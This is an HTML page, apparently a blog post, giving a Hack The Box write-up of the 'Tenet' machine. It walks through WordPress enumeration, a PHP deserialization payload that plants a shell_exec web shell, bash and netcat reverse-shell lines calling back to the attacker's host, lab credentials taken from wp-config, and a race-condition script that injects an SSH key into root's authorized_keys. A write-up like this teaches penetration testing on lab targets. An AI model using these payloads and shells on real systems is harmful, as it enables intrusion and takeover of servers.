@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Tenet&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Tenet" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><img class="site logo" src="/img/NightWolf.jpg" alt /><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Tenet</h1><p class="article date">2021-06-22</p></section><article class="article markdown-body"><p><img  src="/img/tenet-logo.png"
+        alt/></p>
+<p>Tenet starts off with a wordpress site. After some enumeration second domain is found and a PHP file vulnerable to object injection. From there, an attacker can get a shell, find credentials in a configuration file, and privesc to root by leveraging a race condition.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>NMAP shows port 22 is open for SSH and port 80 is running an HTTP server displaying the default apache2 page.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-17 00:47 UTC
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.223
+Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.61 seconds
+</code></pre></div><p>The default page doesn&rsquo;t give us a whole lot of info and there doesn&rsquo;t seem to be a robots.txt. FFUF or another directory brute forcer  can be used to learn there is a wordpress directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -u http://10.10.10.223/FUZZ -w /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
+</span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.223/FUZZ
+ :: Wordlist         : FUZZ: /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+                        <span style="color:#f92672">[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style="color:#f92672">]</span>
+<span style="color:#ae81ff">1</span>                       <span style="color:#f92672">[</span>Status: 200, Size: 1688, Words: 186, Lines: 43<span style="color:#f92672">]</span>
+wordpress               <span style="color:#f92672">[</span>Status: 301, Size: 316, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+                        <span style="color:#f92672">[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style="color:#f92672">]</span>
+server-status           <span style="color:#f92672">[</span>Status: 403, Size: 277, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+:: Progress: <span style="color:#f92672">[</span>220547/220547<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">276</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:13:17<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</code></pre></div><p>Adding <code>tenet.htb</code> to  <code>/etc/hosts</code> will make it function better. Wordpress tends to want to redirect to a domain. There are a few articles talking about their newly coming services and mention of a site migration. On one post, there is a comment that references a &ldquo;sator.php&rdquo; file and a backup version of it. Seemingly, the site migration is incomplete.</p>
+<p><img  src="/img/tenet-migrationcomment.png"
+        alt/></p>
+<p>Sator dosent' exist on this site this site. However,  box might have multiple virtual hosts. That turns out to be the case. After <code>sator.tenet.htb</code> is added <code>/etc/hosts</code> a copy of the wordpress site seen found prior is accessible  On this one, <code>sator.php</code> is present and more importantly, the aforementioned backup version of it, <code>sator.php.bak</code> is also accessible.</p>
+<h2 id="foothold">Foothold</h2>
+<p><img  src="/img/tenet-statorphpbak.png"
+        alt/></p>
+<p><code>sator.php</code> takes input through the <code>arepo</code> parameter. That output is then deserialized. There is also a class that is called DatabaseExport that writes to a file Deseralizaiton can lead to some unintended results through object injection.</p>
+<p>The <code>__destruct ()</code> function means PHP file can be leveraged to create object and from it a file. To  pull this off, write a PHP file that mirrors sator.php but a bit different.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
+{
+    <span style="color:#66d9ef">public</span> $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users.txt&#39;</span>;
+    <span style="color:#66d9ef">public</span> $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update_db</span>()
+    {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
+        $this<span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Sucess&#39;</span>;
+    }
+
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
+    {
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;magic.php&#39;</span>;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php system(&#34;whoami&#34;); ?&gt;&#39;</span>;
+
+    }
+}
+
+$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($app);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Instead of a <code>__destruct</code> a is used <code>__construct</code> and a few other items are changed as well. The output file is going to be called <code>magic.php</code> and the contents will be some simple PHP code to execute the <code>whomami</code> command.</p>
+<p>Running the above file using <code>php file</code> and outputs the following.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-vim" data-lang="vim"><span style="color:#a6e22e">O</span>:<span style="color:#ae81ff">14</span>:<span style="color:#e6db74">&#34;DatabaseExport&#34;</span>:<span style="color:#ae81ff">2</span>:{<span style="color:#a6e22e">s</span>:<span style="color:#ae81ff">9</span>:<span style="color:#e6db74">&#34;user_file&#34;</span>;<span style="color:#a6e22e">s</span>:<span style="color:#ae81ff">9</span>:<span style="color:#e6db74">&#34;magic.php&#34;</span>;<span style="color:#a6e22e">s</span>:<span style="color:#ae81ff">4</span>:<span style="color:#e6db74">&#34;data&#34;</span>;<span style="color:#a6e22e">s</span>:<span style="color:#ae81ff">26</span>:<span style="color:#e6db74">&#34;&lt;?php system(&#34;</span><span style="color:#a6e22e">whoami</span><span style="color:#e6db74">&#34;); ?&gt;&#34;</span>;}<span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>This can be sent to the server using the <code>arepo</code> argument. Then a request can be made to <code>10.10.10.223/magic.php</code>. The response is <code>www-data</code>, showing code execution.</p>
+<p><em>If you are interested in learning more about PHP deserialization attacks, IppSec has some awesome videos I referenced while working on this. <a href="https://youtu.be/JpzREo7XLOY?t=4174"target="_blank" rel="noopener noreferrer">Player 2 PHP deserialization to place an SSH key.</a>
+ and <a href="https://www.youtube.com/watch?v=HaW15aMzBUM"target="_blank" rel="noopener noreferrer">Intro to PHP deserialization</a>
+</em></p>
+<p>This is a bit clumsy though and there are some ways it can be nicened up.</p>
+<p>First  <code>whoami</code> can be changed to instead take the  argument <code>c</code> from a get request and execute using the system function.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>That can be created on the Tenet with following.
+<code>http://sator.tenet.htb/sator.php?arepo=O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:9:&quot;magic.php&quot;;s:4:&quot;data&quot;;s:37:&quot;&lt;?php echo shell_exec($_GET[&quot;c&quot;]); ?&gt;&quot;;}</code></p>
+<p>This is very workable and requests can be  sent  with curl, burp, postman, or even just a web browser. But console applications are cool.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> readline
+
+URI <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Path to PHP shell. (http://example.site/file.php)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Sending commands to: &#34;</span> <span style="color:#f92672">+</span> URI)
+
+<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+	command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt;&#34;</span>)
+	<span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;exit&#39;</span>:
+		<span style="color:#66d9ef">break</span>
+	<span style="color:#66d9ef">else</span>:
+		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(URI<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?c=&#34;</span> <span style="color:#f92672">+</span> command)
+		<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>text)
+</code></pre></div><p>It&rsquo;s fairly simple in nature but it does give a way to send and receive commands a terminal like interface. Now that that is ready to go, it&rsquo;s time to get a proper reverse shell.</p>
+<p>The old fallback of <code>basn -c 'bash -i &gt;&amp;/dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'</code> fails along with a similar one using netcat <code>nc -e /bin/sh &lt;ip&gt; &lt;port&gt;</code>. There is more than one way to send this payload though.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+basn -c <span style="color:#e6db74">&#39;bash -i &gt;&amp;/dev/tcp/10.10.14.36/5678 0&gt;&amp;1&#39;</span>
+</code></pre></div><p>This file is created and saved, a python HTTP server is started in the same directory, and a netcat listener on port 5678. Then we go back to back to our &ldquo;terminal&rdquo; access for Tenet, wget the file, mark it as executable and run it. Right away the netcat listener get&rsquo;s a connection.</p>
+<p><img  src="/img/tenet-properreverseshellsteps.png"
+        alt/></p>
+<h2 id="user">User</h2>
+<p>The CWD is wordpress home directory. Listing the files shows the <code>wp-config.php</code>  file. Inside are credentials configured for interacting with the MySQL database. <code>neil:Opera2112</code>. Neil used the same password for their login allowing SSH access directory to the box.</p>
+<p><img  src="/img/tenet-wp-configphp.png"
+        alt/></p>
+<h2 id="root">Root</h2>
+<p><img  src="/img/tenet-neilsudopermissions.png"
+        alt/></p>
+<p>Via <code>sudo -l</code> Niel&rsquo;s sudo permissions can be checked. It turns it out they can run a script called<code>EnableSSH.sh</code> with root permissions.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+<span style="color:#75715e">#!/bin/bash</span>
+
+checkAdded<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+        sshName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/bin/echo $key | /usr/bin/cut -d <span style="color:#e6db74">&#34; &#34;</span> -f 3<span style="color:#66d9ef">)</span>
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+        <span style="color:#66d9ef">else</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+        <span style="color:#66d9ef">fi</span>
+
+<span style="color:#f92672">}</span>
+
+checkFile<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -s $1 <span style="color:#f92672">]]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[[</span> ! -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Error in creating key file!&#34;</span>
+
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> /bin/rm $1; <span style="color:#66d9ef">fi</span>
+
+                exit <span style="color:#ae81ff">1</span>
+
+        <span style="color:#66d9ef">fi</span>
+
+<span style="color:#f92672">}</span>
+
+addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+        tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
+
+        <span style="color:#f92672">(</span>umask 110; touch $tmpName<span style="color:#f92672">)</span>
+
+        /bin/echo $key &gt;&gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+<span style="color:#f92672">}</span>
+
+key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
+addKey
+checkAdded
+</code></pre></div><p>The script is fairly simple in nature. First, it creates a temp file in <code>/tmp</code> and then it echos the root public root SSH key. Then it adds that file to the <code>/root/.ssh/authorized_keys</code> file and checks to make sure the key was added successfully.</p>
+<p>This creates a race conidion. If that file is overwritten by a diffrent SSH key before it is added to <code>/root/.ssh/authorized_keys</code>, it would grant SSH access as the root user.</p>
+<p>A simple bash can be used to check to check if the temp file has been created. If it has, it will be overwritten with a key key of our choosing. Place all this in a while loop and start it running.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+        echo <span style="color:#e6db74">&#34;Checking for temp file...&#34;</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#66d9ef">$(</span> ls /tmp/ssh-* 2&gt;/dev/null <span style="color:#66d9ef">)</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+                echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6+U/U+EtFlAU/0QuXeMehQgipru8HqD+TOoGMoM8pON+Brgvr0ThHzSq14wSC6F8yZsHbHYgb7gVutcNsADD+mkl+aZn97385WgWxwYZdW6a8VRLCRFr9nLZhwGeBEJC33+GbKyn3P5flagzgdTlhSBeNxuIh1ahxhnunpEQO7x+J8vyP1ZzYbU2ukApurzkMbV3osD7ovKIKxHc9zbPLOT/907tpz0bT4K3PLsh2FTNjK7xhTNWbqO975+x0d/Ni3UIcmyEb6APTz2ipxqWELpw041Fj6uxzq9pRWLuMypV9vCP9smybu22yEClb4t4J3r63qFl+hpzEwcO8JS7gdhUI9oB7VxyrcjLM4/5MPCnW0faulAUnpspWMsaqun2OjJ1tQMtVJKT3WkUT/We6CPx6YigxnQgV6nUHW3qZ3ZCgvHRot8IRpCYA/fImMcWhuseX5dWGHOJtL641h43xI8AZPQylNkPepCzEa5vQ/b+tKaG7cWxjVD4jbgg4ZRk= root@ubuntu&#34;</span> &gt; /tmp/ssh-*
+                echo <span style="color:#e6db74">&#34;File found and overwritten&#34;</span>
+                exit
+        <span style="color:#66d9ef">fi</span>
+        echo <span style="color:#e6db74">&#34;File not found. Continuing.&#34;</span>
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p><code>EnableSSH.sh</code> can then be run from another session. The Overwrite script reports it found and overwrote a file and <code>EnableSSH.sh</code> tells us the key was added successfully.</p>
+<p><img  src="/img/tenet-fileoverwritten.png"
+        alt/></p>
+<p>The private key matching the public key used in the script can then be used to SSH to Tenet with root permissions.</p>
+<h2 id="wrap-up">Wrap Up</h2>
+<p>Thanks <a href="https://app.hackthebox.eu/users/94858"target="_blank" rel="noopener noreferrer">egotisticalSW</a>
+ for making this machine! I overall had a ton of fun. There was some difficulty on the root privesc. It took two days of attempting to finally get it working and switching to VIP+ servers. I think the challenge was I kept running into other people working on it at the same time and our scripts were clashing. I could see that getting very frustrating.</p>
+</article>
+</div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/htb-writeups/scriptkiddie-writeup/"><span class="iconfont icon-article"></span>HTB ScriptKiddie</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div>
+</section></body>
+
+</html>
